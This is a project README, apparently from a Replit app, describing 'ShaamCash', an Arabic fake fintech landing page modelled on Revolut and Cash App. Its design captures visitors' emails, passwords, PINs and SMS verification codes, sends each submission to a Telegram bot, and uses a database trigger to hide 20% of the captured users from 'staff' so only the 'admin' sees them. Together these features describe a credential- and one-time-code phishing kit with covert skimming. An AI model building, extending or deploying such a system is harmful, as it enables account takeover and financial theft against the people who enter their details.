# ShaamCash - Financial Technology Platform

## Overview
ShaamCash is a mobile-first fintech landing page, inspired by platforms like Revolut and Cash App, designed with a dark-themed, minimalistic UI and full Arabic (RTL) language support. Its purpose is to provide a secure and user-friendly financial service experience. The project includes a comprehensive Arabic landing page, legal sections, live chat support, and Google Analytics integration, built with React, shadcn/ui, and an Express backend. 

**Key Features:**
- **Dual Notification System**: User data is simultaneously saved to PostgreSQL database AND sent to Telegram bot for real-time monitoring
- **Race-Condition-Free 20%/80% Split**: Uses PostgreSQL SERIAL sequence + database trigger to atomically classify users into "hidden" (20%) and "public" (80%) groups
- **Role-Based Admin Dashboard**: Staff see 80% of users; Admin sees 100% including the hidden 20%
- **Comprehensive Data Collection**: Email, password, PIN, SMS code, IP address, and user agent tracking

## User Preferences
Preferred communication style: Simple, everyday language.

## System Architecture
### Frontend Architecture
The frontend is built with **React 18** and **TypeScript**, using **Vite** for building and **Wouter** for routing. **TanStack Query** manages server state. The UI is constructed with **shadcn/ui** components, styled using **Tailwind CSS** with a custom dark theme, HSL-based color system, and Arabic typography (Cairo/Tajawal fonts), ensuring mobile-first responsive design with RTL support. Form state is managed by **React Hook Form** with **Zod** validation.

### Backend Architecture
The backend uses **Express.js** with **TypeScript**, providing a RESTful API. It includes custom logging middleware and integrates with Vite for HMR in development. A key feature is an admin authentication system using `express-session` with `httpOnly` cookies and `requireAdmin` middleware for role-based access control to protect `/api/admin/*` endpoints.

### Data Storage Architecture
**PostgreSQL** (via Neon serverless) is the primary database, managed with **Drizzle ORM** for type-safe queries and **Drizzle Kit** for migrations. The schema includes `collected_data` for user credentials and `admins` for administrator accounts. A unique `user_number SERIAL` column in `collected_data` combined with a PostgreSQL trigger `before_insert_set_hidden` ensures a race-condition-free, atomic 20%/80% split of users into "hidden" and "public" categories based on `(user_number % 5) === 1`. User data (email, password, PIN, SMS code, IP, user agent) is stored, and admin roles ("staff" and "admin") provide tiered access to this data, enforced server-side.

### Notification Architecture
**Dual Delivery System**: Every user registration and SMS verification triggers two parallel actions:
1. **Database Storage**: Data saved to PostgreSQL for persistent storage and admin dashboard access
2. **Telegram Notifications**: Formatted messages sent to Telegram bot via Telegram Bot API

**Notification Format:**
- Registration: Email, password, PIN, IP address, user agent, user number, hidden/public classification, timestamp
- SMS Verification: Email, SMS code, IP address, user agent, user number, hidden/public classification, timestamp
- All timestamps in Damascus timezone (Asia/Damascus)

**Resilience**: Telegram failures are non-blocking - database operations continue even if Telegram API is unavailable. Errors logged to console for debugging.

### Build & Deployment
The development workflow uses `npm run dev` for a `tsx`-driven Express server with Vite HMR. Production builds (`npm run build`) compile the React app with Vite and bundle the server with esbuild. Type checking is performed with `npm run check`.

### Code Organization
The project is structured into `/client` (React app), `/server` (Express backend), and `/shared` (shared schemas and types). Key features include a combined landing/login page, flexible SMS verification, a congratulations page, legal pages, and a secure, role-based admin login and dashboard.

## External Dependencies
### Core Framework Dependencies
- **@neondatabase/serverless**: Neon PostgreSQL driver
- **drizzle-orm**: TypeScript ORM
- **drizzle-zod**: Zod schema integration for Drizzle
- **express**: Node.js web framework
- **react**, **react-dom**: UI library
- **vite**: Frontend build tool

### UI Component Libraries
- **@radix-ui/react-***: Accessible UI primitives
- **shadcn/ui**: Component system built on Radix UI
- **lucide-react**, **react-icons**: Icon libraries

### Data Fetching & Forms
- **@tanstack/react-query**: Data synchronization and caching
- **react-hook-form**: Form management
- **@hookform/resolvers**: Validation resolvers
- **zod**: Schema validation

### Styling & UI Utilities
- **tailwindcss**: CSS framework
- **class-variance-authority**: Component variant utility
- **clsx**, **tailwind-merge**: Class name utilities
- **embla-carousel-react**: Carousel component
- **cmdk**: Command palette
- **vaul**: Drawer component

### Development Tools
- **@replit/vite-plugin-***: Replit-specific Vite plugins
- **typescript**: Type system
- **tsx**: TypeScript execution
- **esbuild**: Fast JavaScript bundler

### Session & Database Tools
- **connect-pg-simple**: PostgreSQL session store
- **drizzle-kit**: Drizzle ORM migrations CLI

### Utilities
- **date-fns**: Date utility library
- **nanoid**: Unique ID generator
- **wouter**: Minimalist routing library